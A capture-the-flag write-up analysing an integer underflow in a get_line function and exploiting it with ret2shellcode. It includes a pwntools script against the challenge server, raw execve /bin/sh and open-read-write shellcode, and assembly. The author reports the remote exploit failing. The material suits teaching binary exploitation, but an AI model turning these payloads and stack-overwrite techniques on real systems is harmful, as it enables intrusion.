Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments

```
We are given a binary that opens a file from argv[2] if provided; otherwise, it uses stdin.
```c++
int main(int argc, char **argv) {
    FILE *input;
    char buff[1024];
    
    if(argc > 1) {
        input = fopen(argv[1], "r");
        if(input == NULL) {
            fprintf(stderr, "Failed to open '%s': %s", argv[1], strerror(errno));
            return 2;
        }
    } else {
        input = stdin;
    }
    
    printf("Starting copy into buffer `%p`.\n", buff);
    if(get_line(input, buff, sizeof(buff)) == 0) {
        printf("Input: %s\n", buff);
    } else {
        printf("Failed to input a line.\n");
    }
    
    return 0;
}
```

A leak is also provided to us by the program.
```c++
printf("Starting copy into buffer `%p`.\n", buff);
```

The file is then passed to a function called get_line, which is supposed to copy a line from the file to the buffer.
```c++
int get_line(FILE *in_file, char *s, int len)
{
    int i = len;
    int c = 0;
    for (;;) {
        while (--i > 0) {
            c = fgetc(in_file);
            if (c == '\r' || c == '\n')
                break;
            if ((int)c == EOF)
                return ERROR_EOF;
            *s++ = (char)c;
        }
        if (c != '\n')
            c = fgetc(in_file); /* got \r or something else, now get \n */
        if (c == '\n') {
            *s = '\0';
            break;
        }
        else if ((int)c == EOF)
            return ERROR_EOF;
    }
    return ERROR_OK;
}
```
This function has two loops: an infinite for loop, which only breaks when it encounters a new line character or EOF, and a while loop inside the for loop. The while loop copies a character from the file into a buffer as long as the character is not '\r' or '\n' and it is not EOF. The while loop decrements **i** by one in each iteration before checking if **i** is greater than 0. If it is, the loop continues. So, this function basically gets a line from the file by stopping at '\n'. The maximum length of the line is supposed to be determined by the len argument, which in this case is 1024

# The vulnerability

The while loop has an integer underflow. Since the program subtracts 1 from **i** in each iteration of the for loop before checking if it is greater than 0, providing input larger than 1024 bytes can turn **i** into a negative number.


Disassembly of getline
```
endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 30h
mov     [rbp+in_file], rdi
mov     [rbp+s], rsi
mov     [rbp+len], edx
mov     eax, [rbp+len]
mov     [rbp+i], eax
mov     [rbp+c], 0
jmp     short loc_401255
loc_401255
sub     [rbp+i], 1
cmp     [rbp+i], 0
jg      short loc_40121C   // if [rbp+i] is greater than 0 then jump inside the while loop
```
# Exploiting the integer underflow

First 1024 bytes of the input should make **i** : 0 and one more more byte will make i : 0xFFFFFFFF which is -1 in signed. jg is used for signed numbers. Once I reach 0x7fffffff the jg instruction will make a jump to loc_40121C as 0x7fffffff is 2147483647 in signed.

1024 + 0x80000000
This many bytes should allow for a second write. 
In the first write I wrote my shellcode since NX isn't enabled.

In the second write, I wrote 25 bytes and overwrote the saved Instruction Pointer (IP) with the address of our buffer, executing a simple ret2shellcode.

I was able to get a stable shell locally, but not remotely. So, I tried an open_read_write shellcode to read "/flag.txt" and write it to stdout. however, that didn't work remotely for some reason.
```python
from pwn import *

proc = remote("0.cloud.chals.io", 22110)
proc.sendline("./safe_getline")

proc.recvuntil("`0x")
leak = proc.recvuntil("`.")
leak = leak[:len(leak)-2]
leak = int(leak,16)

print(hex(leak))
#gdb.attach(proc, gdbscript='break *0x401294')
binsh_shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
open_read_write_shellcode = b"\x6A\x74\x48\xB8\x2F\x66\x6C\x61\x67\x2E\x74\x78\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x83\xEC\x40\x48\x89\xE6\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC2\x40\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\x89\xC2\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

shellcode = open_read_write_shellcode

padding = 25 * b"A"

payload = shellcode + b"A" * (1024-len(shellcode)) + b"K" * 0x80000000+ padding + p64(leak)

proc.sendline(payload)

proc.interactive()
```

open_read_write shellcode 
```
push 0x74
mov rax, 0x78742e67616c662f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall


sub rsp, 0x40
mov rsi, rsp
mov rdi, rax
mov rax, 0x0
mov rdx, 0x40
syscall

mov rdi, 0x1
mov rsi, rsp
mov rdx, rax 
mov rax, 0x1
syscall
```
assembled using https://defuse.ca/online-x86-assembler.htm








